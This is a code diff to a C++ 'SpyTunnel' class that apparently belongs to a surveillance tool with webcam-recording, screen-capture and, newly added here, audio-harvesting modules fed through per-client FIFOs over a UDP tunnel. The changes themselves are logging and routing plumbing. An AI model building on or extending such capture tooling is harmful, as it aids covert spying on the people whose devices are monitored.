@@ -53,12 +53,12 @@ void SpyTunnel::run() {
 
     int tries = 0;
     while ((tunnel_fifo_ = open(fifo_path_.c_str(), O_WRONLY | O_NONBLOCK)) == -1 && tries++ < 20) {
-        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created..." << RESET;
+        std::cout << YELLOW << "[SpyTunnel::run] Waiting for FIFO file to be created: " << strerror(errno) << RESET;
         std::this_thread::sleep_for(std::chrono::milliseconds(200));
     }
 
     if (tunnel_fifo_ == -1) {
-        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file" << RESET;
+        std::cerr << RED << "[SpyTunnel::run] Error opening FIFO file " << fifo_path_.c_str() << RESET;
         return;
     }
 
@@ -98,7 +98,7 @@ int SpyTunnel::udp_handshake(void* __arg, int __len) {
 
     struct epoll_event events[2];
 
-    // Send the device num and make sure it is received by the other side
+    // Send the argument and make sure it is received by the other side
     while (true) {
         sendto(tunnel_socket_, __arg, __len, 0, (sockaddr*) &tunnel_end_addr_, tunnel_end_addr_len_);
         std::cout << MAGENTA << "[SpyTunnel::udp_handshake] Sent: " << *static_cast<uint32_t*>(__arg) << " on port:" << ntohs(tunnel_end_addr_.sin_port) << RESET;
@@ -220,6 +220,8 @@ void SpyTunnel::edit_fifo_path(int __client_index, CommandCode __command_code) {
         fifo_path_ = WEBCAM_RECORDER_FIFO_PATH + std::to_string(__client_index);
     } else if (__command_code == SCREEN_HUNTER) {
         fifo_path_ = SCREEN_HUNTER_FIFO_PATH + std::to_string(__client_index);
+    } else if (__command_code == ALSA_HARVESTER) {
+        fifo_path_ = ALSA_HARVESTER_FIFO_PATH + std::to_string(__client_index);
     }
 }
 
